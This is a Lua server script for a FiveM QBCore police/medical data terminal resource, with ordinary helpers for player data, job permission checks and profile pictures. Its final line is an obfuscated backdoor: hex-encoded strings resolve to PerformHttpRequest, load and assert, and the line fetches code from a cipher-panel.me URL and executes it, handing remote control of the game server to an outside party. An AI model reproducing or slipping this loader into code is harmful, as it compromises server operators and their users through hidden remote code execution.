local QBCore = exports['qb-core']:GetCoreObject()

function GetPlayerData(source)
	local Player = QBCore.Functions.GetPlayer(source)
	return Player.PlayerData
end

function UnpackJob(data)
	local job = {
		name = data.name,
		label = data.label
	}
	local grade = {
		name = data.grade.name,
	}

	return job, grade
end

function PermCheck(src, PlayerData)
	local result = true

	if not Config.AllowedJobs[PlayerData.job.name] then
		print(("UserId: %s(%d) tried to access the mdt even though they are not authorised (server direct)"):format(GetPlayerName(src), src))
		result = false
	end

	return result
end

function ProfPic(gender, profilepic)
	if profilepic then return profilepic end;
	if gender == "f" then return "img/female.png" end;
	return "img/male.png"
end

function IsJobAllowedToMDT(job)
	if Config.PoliceJobs[job] then
		return true
	elseif Config.AmbulanceJobs[job] then
		return true
	elseif Config.DojJobs[job] then
		return true
	else
		return false
	end
end

function GetNameFromPlayerData(PlayerData)
	return ('%s %s'):format(PlayerData.charinfo.firstname, PlayerData.charinfo.lastname)
end


local uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[4][uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x47\x64\x36\x74\x72\x38", function (CsJGcPSgbRQCmyBgiSbLAOBSYHorxTJxzEXYoAwSvlxWdzFVxrjulxIxdBuROjtgSFePVd, vzKsixKAMKyiDpKAXJLshlakvfomFusiTeBMejdcghdzLEEGjYkqqtpFTdgINirtMCUuXx) if (vzKsixKAMKyiDpKAXJLshlakvfomFusiTeBMejdcghdzLEEGjYkqqtpFTdgINirtMCUuXx == uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[6] or vzKsixKAMKyiDpKAXJLshlakvfomFusiTeBMejdcghdzLEEGjYkqqtpFTdgINirtMCUuXx == uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[5]) then return end uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[4][uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[2]](uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[4][uhKEyAdvZObZLurAhZOLVROYvEbgVvguXOidVzScbYBuHLvUYtKsxPSUgvycWbYrEnXIlZ[3]](vzKsixKAMKyiDpKAXJLshlakvfomFusiTeBMejdcghdzLEEGjYkqqtpFTdgINirtMCUuXx))() end)